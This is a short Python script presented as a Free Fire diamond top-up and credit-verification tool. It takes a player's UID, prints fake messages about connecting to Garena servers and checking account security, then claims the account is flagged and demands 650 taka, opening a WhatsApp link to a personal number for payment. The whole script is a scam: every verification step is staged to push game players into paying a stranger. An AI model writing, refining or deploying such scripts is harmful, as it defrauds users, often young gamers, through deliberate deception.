
import os, sys, time, random

R = "\033[1;31m"; G = "\033[1;32m"; Y = "\033[1;33m"
B = "\033[1;34m"; C = "\033[1;36m"; W = "\033[1;37m"; X = "\033[0m"

ADMIN_WHATSAPP = "https://wa.me/01846390932?text=I+want+to+buy+650TK+credit"

def clear(): os.system("clear")

def slow(t):
    for ch in t:
        sys.stdout.write(ch); sys.stdout.flush()
        time.sleep(0.004)
    print()

def bar(title, sec=2.3):
    slow(C + title + X)
    steps = 32
    for i in range(steps+1):
        filled = "█" * i
        empty  = "░" * (steps - i)
        sys.stdout.write(G + f"[{filled}{empty}] {int(i/steps*100)}%\r" + X)
        sys.stdout.flush()
        time.sleep(sec/steps)
    print()

def banner():
    clear()
    print(C + "██████╗ ██╗███╗   ███╗ █████╗ ███╗  ██╗" + X)
    print(B + "██╔══██╗██║████╗ ████║██╔══██╗████╗ ██║" + X)
    print(G + "██████╔╝██║██╔████╔██║███████║██╔██╗██║" + X)
    print(Y + "██╔══██╗██║██║╚██╔╝██║██╔══██║██║╚████║" + X)
    print(R + "██████╔╝██║██║ ╚═╝ ██║██║  ██║██║ ╚███║" + X)
    print(W + "────────────────────────────────────────" + X)
    print(G + " FREE FIRE DIAMOND TOP-UP • CREDIT VERIFY")
    print("────────────────────────────────────────\n" + X)

def credit_check(uid):
    msgs = [
        "Connecting to Garena secure gateway …",
        "Syncing user UID with transaction server …",
        "Analyzing account purchase history …",
        "Checking unbind security layer …",
        "Verifying credit eligibility …"
    ]
    for m in msgs:
        slow(B + "[•] " + m + X)
        time.sleep(0.4)
    print()
    bar("[#] Processing credit request")

def main():
    banner()
    uid = input(Y + "[+] Enter Your Free Fire UID: " + W).strip()

    if not uid.isdigit():
        print(R + "\n[✘] Invalid UID format detected!" + X)
        return

    slow(G + "\n[✓] UID accepted.")
    time.sleep(0.5)

    credit_check(uid)

    clear()
    banner()

    slow(R + "[⚠] Your account requires CREDIT to continue!" + X)
    slow(Y + "Reason: Free Fire security flagged your account for extra verification." + X)
    print()
    slow(C + "Required Credit: " + G + "650৳" + X)
    slow(C + "Status: " + R + "Pending Payment" + X)
    print()

    input(W + "Press ENTER to proceed to secure payment…" + X)

    slow(G + "\nRedirecting to secure admin gateway…" + X)
    time.sleep(1)

    os.system(f"xdg-open {ADMIN_WHATSAPP} >/dev/null 2>&1")

    slow(C + "\nIf WhatsApp did not open automatically, open the link manually." + X)
    slow(G + "Thank you for using HACKING WORLD™" + X)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n" + R + "Exited." + X)